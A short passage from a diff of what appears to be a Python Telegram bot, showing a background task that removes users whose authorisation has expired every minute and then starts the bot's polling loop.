+                if user_data["authorized_until"] < datetime.datetime.now():
+                    del AUTHORIZED_USERS[user_id]
+                    save_authorized_users()
+            await asyncio.sleep(60)
+
+  
+    asyncio.create_task(remove_expired_users())
+
+    
+    await dp.start_polling(bot)
+
+if __name__ == '__main__':
+    asyncio.run(main())
